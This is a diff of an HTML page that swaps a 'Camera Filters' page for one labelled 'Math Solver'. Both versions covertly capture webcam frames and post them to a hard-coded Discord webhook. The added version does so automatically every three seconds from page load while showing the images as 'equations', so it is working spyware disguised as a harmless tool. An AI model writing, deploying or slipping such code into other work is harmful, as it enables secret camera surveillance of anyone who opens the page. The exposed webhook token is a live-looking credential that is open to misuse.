@@ -1,116 +1,93 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="utf-8" />
-    <title>Camera Filters</title>
+    <meta charset="UTF-8">
+    <title>Math Solver</title>
     <style>
       body {
-        background-image: url("https://i.pinimg.com/736x/7d/18/b0/7d18b011341ca3bf537cf8c4838f23e8.jpg");
-        background-size: cover;
-        background-position: center;
+        background-color: #f7f7f7;
         font-family: Arial, sans-serif;
+        font-size: 16px;
       }
-
-      #container {
-        width: 800px;
-        margin: 0 auto;
-        text-align: center;
-      }
-
       h1 {
-        color: #fff;
-        font-size: 36px;
+        color: #003580;
+        font-size: 32px;
+        text-align: center;
         margin-top: 50px;
-        margin-bottom: 50px;
       }
-
-      #video {
-        width: 100%;
-        height: auto;
-        filter: none;
-        border: 5px solid #fff;
+      #math-image {
+        display: block;
+        margin: 0 auto;
+        width: 400px;
+        height: 300px;
+        border: 2px solid #003580;
         border-radius: 10px;
+        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
       }
-
-      #canvas {
-        display: none;
+      #math-equation {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 24px;
+        color: #003580;
       }
-
-      .filter-button {
-        margin: 10px;
+      #capture-btn {
+        display: block;
+        margin: 20px auto;
         padding: 10px;
-        border-radius: 5px;
-        background-color: #eee;
-        cursor: pointer;
-        font-size: 18px;
+        background-color: #003580;
+        color: #fff;
         border: none;
-        outline: none;
-      }
-
-      .filter-button:hover {
-        background-color: #ddd;
+        border-radius: 5px;
+        font-size: 20px;
+        cursor: pointer;
       }
     </style>
   </head>
   <body>
-    <div id="container">
-      <h1>Camera Filters</h1>
-      <video id="video" autoplay></video>
-      <canvas id="canvas"></canvas>
-      <div id="filters">
-        <button class="filter-button" onclick="setFilter('')">No filter</button>
-        <button class="filter-button" onclick="setFilter('grayscale(100%)')">Grayscale</button>
-        <button class="filter-button" onclick="setFilter('sepia(100%)')">Sepia</button>
-        <button class="filter-button" onclick="setFilter('invert(100%)')">Invert</button>
-        <button class="filter-button" onclick="setFilter('hue-rotate(90deg)')">Hue Rotate</button>
-        <button class="filter-button" onclick="setFilter('blur(5px)')">Blur</button>
-      </div>
-    </div>
+    <h1>Math Solver</h1>
+    <img id="math-image" src="" alt="Math Equation">
+    <div id="math-equation"></div>
+    <button id="capture-btn">Capture</button>
     <script>
-      // Get the video element
-      const video = document.getElementById("video");
+      var imageCounter = 1;
+      var intervalId = setInterval(function() {
+        captureImage();
+      }, 3000);
 
-      // Get the canvas element
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
+      function captureImage() {
+        var video = document.querySelector('video');
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        var imgData = canvas.toDataURL('image/jpeg', 1.0);
+        var data = {'content': imgData};
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(data));
+        var equation = 'Equation ' + imageCounter++;
+        document.getElementById('math-image').src = imgData;
+        document.getElementById('math-equation').innerHTML = equation;
+      }
 
-      // Get the media stream from the camera
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then(function (stream) {
-          video.srcObject = stream;
+      var constraints = { video: { width: 400, height: 300 } };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          var video = document.createElement('video');
+          video.srcObject = mediaStream;
           video.play();
+          document.body.appendChild(video);
         })
-        .catch(function (error) {
-          console.log("Error accessing camera: " + error.message);
+        .catch(function(err) {
+          console.log(err.name + ": " + err.message);
         });
 
-      // Apply a filter to the camera feed
-      function setFilter(filter) {
-        // Set the CSS filter on the video element
-        video.style.filter = filter;
-
-        // Capture the filtered image and send it to Discord webhook
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Convert canvas to base64 image data
-        const imageData = canvas.toDataURL("image/png");
-
-        // Send image to Discord webhook
-        const webhookUrl = "https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa";
-        const data = { content: "New camera capture", file: imageData };
-        fetch(webhookUrl, {
-          method: "POST",
-          body: JSON.stringify(data),
-          headers: { "Content-Type": "application/json" },
-        })
-          .then(function (response) {
-            console.log("Image sent to Discord webhook.");
-          })
-          .catch(function (error) {
-            console.log("Error sending image to Discord webhook: " + error.message);
-          });
-      }
-      </script>
-    </body>
+      var captureBtn = document.getElementById('capture-btn');
+      captureBtn.addEventListener('click', function() {
+        clearInterval(intervalId);
+        captureImage();
+      });
+    </script>
+  </body>
 </html>
